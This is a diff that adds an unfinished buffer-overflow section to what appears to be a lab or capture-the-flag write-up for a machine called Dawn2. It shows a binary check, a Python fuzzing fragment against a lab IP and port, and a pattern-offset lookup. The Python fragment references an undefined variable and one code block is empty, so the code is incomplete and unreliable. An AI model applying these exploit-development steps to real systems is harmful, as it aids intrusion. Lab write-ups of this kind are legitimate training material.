@@ -636,3 +636,37 @@ if __name__ == "__main__":
 
 ![bling](https://user-images.githubusercontent.com/76034874/181871630-b621286e-9424-49de-b801-12e18335066f.png)
 
+
+#Part2 BOF
+## We notice another .exe binary in the 1st directory we land in on the target.  We dowload it same as before to our machine and examine it to find it is the of the same type (x86 Little Endian Windows executable)
+
+```bash
+┌──(root💀kali)-[/home/kali/Documents/VULN/Dawn2]
+└─# file dawn-BETA.exe                            
+dawn-BETA.exe: PE32 executable (console) Intel 80386, for MS Windows
+```
+# Sending the As
+
+```python
+
+server = "192.168.55.12"  #target server
+port = 1435
+As = b'A' * 500
+Bs = b'B' * 4
+payload = As + nullbyte
+```
+
+# Sending Unique Characters
+
+```python
+
+```
+
+```bash
+
+┌──(root💀kali)-[/home/kali/Documents/VULN/Dawn2]
+└─# msf-pattern_offset -q 61413461
+[*] Exact match at offset 13
+```
+
+
